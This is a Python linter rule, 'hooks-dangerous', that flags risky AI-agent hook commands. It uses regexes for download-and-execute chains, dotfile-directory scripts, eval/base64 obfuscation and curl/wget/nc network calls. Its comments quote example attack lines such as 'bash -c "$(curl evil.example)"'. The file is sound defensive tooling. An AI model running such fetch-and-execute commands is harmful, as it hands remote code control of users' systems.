"""
Rule: hooks-dangerous

Flags hook commands that match dangerous patterns: executing scripts from
dotfile directories, download-and-execute, obfuscation, and suspicious
runtimes or network access.
"""

import re
from typing import Dict, List, Set

from skillsaw.diagnostics import safe_display
from skillsaw.rule import Rule, RuleViolation, Severity
from skillsaw.context import RepositoryContext
from skillsaw.rules.builtin.content_analysis import (
    AgentBlock,
    CursorHooksBlock,
    HookEventConfig,
    HooksBlock,
    SettingsBlock,
    SkillBlock,
)

_INTERPRETERS = r"(?:node|bun|deno|python[23]?|ruby|perl|php|bash|sh|zsh|dash)"
# `env` — optionally behind a path, with flags and NAME=value assignments —
# may prefix any command without changing which program runs
# (`env FOO=1 curl …`, `/usr/bin/env -i sh …`).
_ENV_PREFIX = r"(?:(?:\S+/)?env(?:\s+-{1,2}[A-Za-z]+|\s+[A-Za-z_][A-Za-z0-9_]*=\S*)*\s+)?"
_INTERPRETER_CMD = rf"{_ENV_PREFIX}(?:\S+/)?{_INTERPRETERS}"
_SUDO = r"(?:sudo\s+)?"
_DOTFILE_DIRS = r"\.(?:claude|vscode|cursor|codex|github|windsurf)"

# What separates one command from the next. A newline is a separator every
# shell honours, and hook commands arrive as JSON strings where a multi-line
# script is ordinary — `"echo ok\ncurl evil.example"` runs the fetch, so
# omitting it would leave everything past the first line unscanned. A single
# `&` backgrounds the command before it and runs the next
# (`echo ready & curl evil`), so it is a boundary too — listed after `&&` in
# the alternation so the two-character operator is tried first and a real
# `&&` chain is never split into two bare-`&` boundaries. Only the
# substitution spellings `$(…)` and `<(…)` bound a command: their bodies run
# in the same shell context (`bash -c "$(curl evil.example)"`), while a bare
# `(` also appears inside quoted prose (`echo "run (python check.py) later"`)
# where nothing executes. Over-splitting a `2>&1` redirect only scans more,
# never less — the safe direction.
_CMD_BOUNDARY = r"(?:^|\n|\r|&&|\|\||;|\||&|(?:\$\(|<\())"

_SCRIPT_FROM_DOTFILES_RE = re.compile(
    rf"""{_CMD_BOUNDARY}\s*
        {_SUDO}                              # optional sudo
        (?:{_INTERPRETER_CMD})\s+(?:run\s+)? # interpreter [run]
        (?:\S+/)?{_DOTFILE_DIRS}/\S+         # path under dotfile dir
    """,
    re.VERBOSE,
)

# Words that may sit between a command boundary and the executable without
# changing which program runs: POSIX wrappers (`command`, `exec`, `time`,
# `nohup`, …) and sudo with any number of option/value pairs
# (`sudo -n -u nobody curl …`). Heuristic coverage, not shell semantics.
_CMD_WRAPPERS = (
    r"(?:(?:sudo(?:\s+-{1,2}[A-Za-z][\w-]*(?:\s+[A-Za-z_][\w.+-]*)?)*"
    r"|command|exec|builtin|time|nice|nohup|ionice|stdbuf"
    r"|timeout(?:\s+\S+)?)\s+)*"
)
# A download tool in command position — optionally behind wrappers,
# VAR=value assignments, an env wrapper, or a path prefix (`FOO=1 curl …`,
# `command curl …`, `/usr/bin/curl …`) — or as the string an interpreter is
# told to run (`bash -c curl …`, `node -e "…wget…"`, the exec-form hook
# join). Matching the command position instead of any word occurrence keeps
# quoted prose like `echo "use curl to fetch"` from acting as a download
# signal while every real invocation still anchors to a boundary.
_DOWNLOAD_CMD_RE = re.compile(
    rf"{_CMD_BOUNDARY}\s*"
    rf"(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*"  # VAR=value assignment prefixes
    rf"{_CMD_WRAPPERS}"
    rf"{_ENV_PREFIX}(?:\S+/)?"
    rf"(?:curl|wget)\b"
    rf"|(?:^|\n|\r|&&|\|\||;|\||&)\s*"  # command position, then…
    rf"{_CMD_WRAPPERS}(?:{_INTERPRETER_CMD})\s+"  # an interpreter…
    rf"-{{1,2}}(?:command|eval|lc|c|e)\s+[\"']?"  # running a string (maybe quoted)…
    rf"(?:sudo\s+)?(?:\S+/)?(?:curl|wget)\b"  # …that invokes a download
)
# A fetch wrapped in process or command substitution feeds an interpreter
# directly — `bash <(curl …)`, `bash -c "$(curl …)"` — with no shell
# separator between the download and the interpreter, so the substitution
# form is a download signal in its own right.
_SUBSTITUTION_FETCH_RE = re.compile(
    r"""[<$]\(\s*(?:sudo\s+)?(?:curl|wget|nc|ncat)\b  # $(curl …)  <(curl …)
        |`(?:sudo\s+)?(?:curl|wget|nc|ncat)\b          # `curl …`
    """,
    re.VERBOSE,
)
# Where a download segment writes its payload — curl/wget `-o`/`-O`,
# `--output[=] `, or a shell redirect. A later segment that invokes one of
# these paths pairs the download with it even when intermediate commands
# (chmod, mv) sit between them.
_ARTIFACT_TARGET_RE = re.compile(r"(?:-o|-O|--output)[=\s]+(\S+)|>{1,2}\s*(\S+)")
# The same boundary set as _CMD_BOUNDARY, so the tokenizer and the anchored
# patterns in this module cannot drift: `||` is one operator (splitting on
# bare `|` alone used to leave an empty middle segment that masqueraded as a
# pipe), and a single `&` backgrounds and runs the next command.
_SHELL_SEPARATOR_RE = re.compile(r"(&&|\|\||;|\||&)")
_PIPE_INTERPRETER_SEGMENT_RE = re.compile(rf"^\s*{_SUDO}(?:{_INTERPRETER_CMD})\b")
_CHAIN_INTERPRETER_SEGMENT_RE = re.compile(rf"^\s*{_SUDO}(?:{_INTERPRETER_CMD})\s+\S+")

_OBFUSCATION_RE = re.compile(
    r"""
        \beval\s+["\$(\`]                      # eval with expansion
        |base64\s+(?:-d|--decode)              # base64 decode
    """,
    re.VERBOSE,
)

_BUN_RE = re.compile(rf"{_CMD_BOUNDARY}\s*{_SUDO}(?:\S+/)?bun\s+(?:run\s+)?\S+")

_NETWORK_FETCH_RE = re.compile(
    rf"{_CMD_BOUNDARY}\s*"
    rf"(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*"  # VAR=value assignment prefixes
    rf"{_CMD_WRAPPERS}{_ENV_PREFIX}(?:\S+/)?(?:curl|wget|nc|ncat)\b"
)


def _mask_quoted_separators(line: str) -> str:
    """Blank `&`, `|`, `;` inside single/double quotes before tokenizing.

    The tokenizer splits on shell separators, but a separator inside quotes
    is data — `'https://x.test/p?a=1&b=2'` is one argument, and the split
    would otherwise clear the download carry mid-URL. Unquoted lines pass
    through untouched; an unmatched quote degrades to more splitting, which
    only ever loses pairing (never invents it).

    Separators inside a double-quoted command substitution stay live —
    `"$(curl x; sh y)"` executes both — so once `$(` or a backtick appears
    inside the current double-quoted span, masking stops for its remainder.
    Single quotes never execute, so their contents stay masked throughout.

    Substitution markers (`$`, `<`, backtick) are masked inside quoted spans
    too: `'$(python .claude/x.sh)'` only ever echoes its literal. A `$(` or
    backtick in double quotes flips the span live before it can be masked,
    because there those forms really do execute.
    """
    if "'" not in line and '"' not in line:
        return line
    out = []
    quote = None
    live = False
    for index, char in enumerate(line):
        if quote and not live:
            # The live trigger must win over masking: in double quotes a $(
            # or backtick executes, so it is never masked.
            if quote == '"' and (char == "`" or (char == "$" and line.startswith("(", index + 1))):
                live = True
            elif char in "&|;$<`":
                out.append("\x00")
                continue
            elif char == quote:
                quote = None
        elif not quote and char in "\"'":
            quote = char
            live = False
        out.append(char)
    return "".join(out)


def _downloads_and_executes(command: str) -> bool:
    """Whether a download feeds or precedes an interpreter, in linear time."""
    # The former unanchored ``curl.*`` patterns restarted a suffix scan at
    # every repeated token. Tokenize shell separators once instead. Newlines
    # reset the chain because the original regex deliberately did not span
    # them; each line is still scanned independently by the network rule.
    #
    # Carry rules mirror the shell: a download stays live across any number
    # of pipes because every stage consumes the previous stage's output, but
    # across ``&&``/``;``/``&`` only an interpreter directly after the
    # download pairs with it — in ``curl url; cat notes | python -`` the
    # interpreter reads local files, not the download. Nothing crosses
    # ``||``: its right side runs only when the download failed. The pairing
    # survives intermediate non-interpreter commands when they name a path
    # the download wrote (`curl -o x url && chmod +x x && sh x`), tracked by
    # the per-line artifact set.
    for line in command.split("\n"):
        pieces = _SHELL_SEPARATOR_RE.split(_mask_quoted_separators(line))
        piped_download = False
        chained_download = False
        artifact_paths: Set[str] = set()
        for index in range(0, len(pieces), 2):
            via_pipe = False
            via_chain = False
            if index:
                separator = pieces[index - 1]
                if separator == "|":
                    via_pipe = piped_download
                elif separator == "||":
                    # The right side runs only when everything before it
                    # failed, so a path written there was never produced.
                    artifact_paths.clear()
                else:  # "&&", ";", "&"
                    via_chain = chained_download
            segment = pieces[index]
            if not segment.strip():
                continue
            substitution_fetch = _SUBSTITUTION_FETCH_RE.search(segment) is not None
            segment_downloads = _DOWNLOAD_CMD_RE.search(segment) is not None or substitution_fetch
            if segment_downloads:
                artifact_paths.update(
                    path for pair in _ARTIFACT_TARGET_RE.findall(segment) for path in pair if path
                )
                if substitution_fetch and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
                    return True  # self-contained: bash <(curl …), bash -c "$(curl …)"
            if via_pipe and _PIPE_INTERPRETER_SEGMENT_RE.match(segment):
                return True
            if via_chain and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment):
                return True
            if (
                artifact_paths
                and _CHAIN_INTERPRETER_SEGMENT_RE.match(segment)
                and {word.strip("\"'") for word in segment.split()} & artifact_paths
            ):
                return True  # interpreter consumes a downloaded path
            piped_download = via_pipe or segment_downloads
            chained_download = segment_downloads
    return False


def dangerous_command_descriptions(command: str) -> List[str]:
    """Return messages for dangerous patterns in a command."""
    # Quote-aware view: separators inside quotes are argument data, so the
    # anchored patterns must not treat them as command boundaries. Masking
    # is idempotent, and _downloads_and_executes masks again per line.
    command = _mask_quoted_separators(command)
    findings: List[str] = []

    if _SCRIPT_FROM_DOTFILES_RE.search(command):
        findings.append("executes a script from a dotfile directory")

    if _downloads_and_executes(command):
        findings.append("downloads and executes remote code")

    if _OBFUSCATION_RE.search(command):
        findings.append("uses obfuscation techniques (eval/base64)")

    if not findings and _BUN_RE.search(command):
        findings.append("uses bun runtime (uncommon in hooks, verify intent)")

    if not findings and _NETWORK_FETCH_RE.search(command):
        findings.append("performs network requests (verify intent)")

    return findings


class HooksDangerousRule(Rule):
    """Flag hook commands matching dangerous patterns."""

    since = "0.12.0"

    config_schema = {
        "allowlist": {
            "type": "list",
            "default": [],
            "description": "Hook commands to permit (exact match)",
        },
    }

    @property
    def rule_id(self) -> str:
        return "hooks-dangerous"

    @property
    def description(self) -> str:
        return (
            "Flags hook commands that execute scripts from dotfile directories, "
            "download-and-execute chains (curl|sh), obfuscation (eval/base64), "
            "or perform network requests"
        )

    def default_severity(self) -> Severity:
        return Severity.ERROR

    def _is_allowed(self, command: str) -> bool:
        allowlist = self.config.get("allowlist", [])
        return any(command == entry for entry in allowlist)

    def _check_events(
        self,
        events: Dict[str, List[HookEventConfig]],
        file_path,
        line=None,
    ) -> List[RuleViolation]:
        violations = []
        for event_type, configs in events.items():
            for cfg in configs:
                for handler in cfg.handlers:
                    if handler.type != "command" or not handler.command:
                        continue
                    # Exec-form hooks split the invocation across command +
                    # args; scan the joined form so patterns can't hide in args.
                    command = handler.command
                    if isinstance(handler.args, list):
                        command = " ".join([command, *(str(a) for a in handler.args)])
                    if self._is_allowed(handler.command) or self._is_allowed(command):
                        continue
                    for message in dangerous_command_descriptions(command):
                        violations.append(
                            self.violation(
                                f"Hook {safe_display(event_type)}: {message} — "
                                f"command: {safe_display(command)!r}",
                                file_path=file_path,
                                line=line,
                            )
                        )
        return violations

    def check(self, context: RepositoryContext) -> List[RuleViolation]:
        violations = []

        # CursorHooksBlock renders its flatter shape as HookEventConfig too.
        hook_blocks = context.lint_tree.find(HooksBlock) + context.lint_tree.find(CursorHooksBlock)
        for block in hook_blocks:
            if block.parse_error:
                continue
            violations.extend(self._check_events(block.events, block.path))

        for block in context.lint_tree.find(SettingsBlock):
            if block.parse_error:
                continue
            violations.extend(self._check_events(block.hooks_events, block.path))

        # Skill and agent frontmatter can declare hooks with the same schema —
        # a checked-in, shareable command-execution vector.
        for block in context.lint_tree.find(SkillBlock) + context.lint_tree.find(AgentBlock):
            if block.frontmatter_error:
                continue
            events = block.hooks_events
            if events:
                violations.extend(
                    self._check_events(events, block.path, line=block.key_line("hooks"))
                )

        return violations
